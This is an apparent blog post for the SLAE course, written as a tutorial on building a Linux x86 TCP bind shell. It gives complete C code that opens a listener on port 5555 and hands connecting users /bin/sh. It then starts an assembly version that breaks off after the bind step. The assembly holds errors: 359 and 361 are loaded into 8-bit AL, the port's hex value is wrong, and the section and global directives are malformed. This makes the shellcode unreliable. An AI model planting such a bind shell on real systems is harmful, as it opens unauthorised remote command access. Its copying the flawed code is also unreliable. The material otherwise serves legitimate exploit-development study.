---
layout: single
title: SLAE Assignment 1 -- TCP Bind Shell
date: 2019-5-4
classes: wide
header:
  teaser: /assets/images/OSCP/pwk.png
tags:
  - SLAE
  - Linux
  - x86
  - Shellcoding
--- 
![](/assets/images/OSCP/OSCP.png)

## Introduction

The first SLAE assignment is to develop shellcode for a bind TCP shell. What is a bind TCP shell? According to [Infosec Institute](https://resources.infosecinstitute.com/icmp-reverse-shell/#gref), a bind shell is "a type of shell in which the target machine opens up a communication port or a listener on the victim machine and waits for an incoming connection. The attacker then connects to the victim machine’s listener which then leads to code or command execution on the server."

I found that while not an easy subject, the actual assembly code construction was not very difficult. The learning curve from this assignment really came from trying to wrap my head around 'socket programming' fundamentals. The hardest part for me was trying to parse man page information about the various syscalls and trying to understand how to format the arguments required for each syscall. Let's jump right into it. 

## Prototype

The first thing we want to do, in order to see the syscalls required to support the creation of a bind shell, is find the simplest implementation of a bind shell in a language higher than assembly. After a bit of googling, the simplest version of a bind shell in C that I could find is the following, with my comments added:

```c
#include <stdio.h>
#include <strings.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void) {

    // This is our first syscall, the socket() call. 
    int listen_sock = socket(AF_INET, SOCK_STREAM, 0);

    // It looks like here we're building a 'struct' which consists of AF_INET, the interface we want to listen on (all), and a port number to bind on. This entire entity will be referenced in arguments for the next syscall: bind()    
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;           
    server_addr.sin_addr.s_addr = INADDR_ANY;  
    server_addr.sin_port = htons(5555);        

    // Our second syscall, and perhaps the most complicated: bind() 
    bind(listen_sock, (struct sockaddr *)&server_addr, sizeof(server_addr));

    // Our third syscall is listen()
    listen(listen_sock, 0);

    // Our fourth syscall is accept() 
    int conn_sock = accept(listen_sock, NULL, NULL);

    // Our fifth syscall, dup2(), is used 3 times
    dup2(conn_sock, 0);
    dup2(conn_sock, 1);
    dup2(conn_sock, 2);

    // Our final syscall is execve(), which runs a program fed to it as a string
    execve("/bin/sh", NULL, NULL);
}
```
Now that that's settled, it's become apparent we need to execute 6 syscalls in our assembly code:
+ socket
+ bind
+ listen
+ accept
+ dup2
+ execve

## Building Our Assembly Code

### Assembly Skeleton Code
```nasm
global_start

section .txt
_start:
```
The first thing we want to do is to clear out the registers we're going to use immediately. How do we know what registers we want to use? You can think of your syscall as something like an arg[0] in a command line program. So that's always going to correspond with the first register, EAX. Subsequent arguments will follow sequentially: arg[1] will correspond to EBX, arg[2] will correspond to ECX, etc.

If we consult `man 2 socket` for our first syscall, socket, we see that it takes 3 arguments in the following fashion:`int socket(int domain, int type, int protocol);`

So counting the syscall itself and its 3 arguments, we need to clear the first 4 registers so that we can work with those. Let's clear them by XOR'ing them with themselves so that we clear them in a way that does not introduct NULL BYTEs into our shellcode.

```nasm
global_start

section .txt
_start: 
  
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
```

## Socket Syscall

Let's now figure out what we're going to put into EAX to call socket. We can do this with a `cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket` which tells us that the code for socket is 359. Popping 359 as decimal into a hex converter tells us that the hex equivalent is `0x167`, so let's place that in the low space of EAX so as to not introduce any NULL BYTEs with padding. 

```nasm
    mov al, 0x167
```

Now let's start with the arguments. `man 2 socket` tells us that the first argument is `int domain` which we see in the man page is `AF_INET` for IPv4. Let's just google 'value for AF_INET' and see what value we should use in the argument. Our first [result](http://students.mimuw.edu.pl/SO/Linux/Kod/include/linux/socket.h.html) is a university webpage which looks to be a header file explaining not only the value of `AF_INET` but also of `SOCK_STREAM` which is going to be our second value to satisfy the `int type` argument. According to the file, `AF_INET` is 2 and `SOCK_STREAM` is 1 (`0x02` and `0x01`) respectively. The last argument value for `int protocol` is going to be '0' according to the man page. So we need the following register and value combinations:
+ EBX == 0x02
+ ECX == 0x01
+ EDX == 0

Let's make these changes to our assembly code. If you remember, we already cleared EDX, so our zero value is already accounted for, so need to mess with that register at all. 

```nasm
    mov bl, 0x02
    mov cl, 0x01
```

Next we need to pass control to the [interrupt vector](https://stackoverflow.com/questions/1817577/what-does-int-0x80-mean-in-assembly-code) in order to handle our syscall (socket). 

```nasm
    int 0x80
```

Lastly, before moving on, we will need a way to identify this socket we've just created to subsequent systemcalls. We can do this by storing the value of EAX off to the side so that we can reference it later and still use EAX in our subsequent systemcalls. I chose to store this value in EDI as EDI is pretty far down our list of registers we'd fill arguments with, no idea if this makes sense, but it worked!

```nasm
    mov edi, eax
```

## Bind Syscall

First thing we want to do here is clear out EAX so that we can put the value of our bind call into the lower part of the register as we did above with socket. `cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket` gives us a value of 361 which is `0x169`

Let's make these changes to our code

```nasm
    xor eax, eax
    mov al, 0x169
```

Now we need to consult `man 2 bind` to figure out the structure of the arguments this syscall requires. The result is `int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);`

These arguments can be summarized at a high-level as follows: 
+ `int sockfd` -- this is a reference to the socket we just created, this is why we moved EAX into EDI 
+ `const struct sockaddr *addr` -- this is a pointer to the location on the stack of the sockaddr struct we are going to create
+ `socklen_t addrlen` -- this is the length of the address which the `/usr/include/linux/in.h` file tells us is 16

Let's start with satisfying the `int sockfd` argument. 

```nasm
    mov ebx, edi
```

Now, let's start creating our sockaddr struct on the stack. A [sockets programming tutorial](http://home.iitk.ac.in/~chebrolu/scourse/slides/sockets-tutorial.pdf) tells us that the sockaddr_in struct for the bind syscall consists of the following 4 components:
+ AF_INET
+ Port Number
+ Internet address
+ 0

Let's start moving these values into the registers. Our port number will be 5555 and our internet address will be 0.0.0.0

Because the stack grows from High to Low, we will have to place these arguments onto the stack in reverse order. We will also have to put our port number in Little Endian format, so instead of 0x1563, we will place 0xb315 onto the stack.

```nasm
    push 0
    push 0
    push word 0xb315
    push word 0x02
```

Boom! Struct completed. Let's put the pointer to this entity into the ECX register so that we can satisfy our `const struct sockaddr *addr` argument. We'll also put 16 into the low part of the EDX register and call the interrupt again while we're here since that's easy enough. 

```nasm 
    mov ecx, esp
    mov dl, 16
    int 0x80
```

##





## Resources

https://stackoverflow.com/questions/1817577/what-does-int-0x80-mean-in-assembly-code
https://resources.infosecinstitute.com/icmp-reverse-shell/#gref
http://home.iitk.ac.in/~chebrolu/scourse/slides/sockets-tutorial.pdf
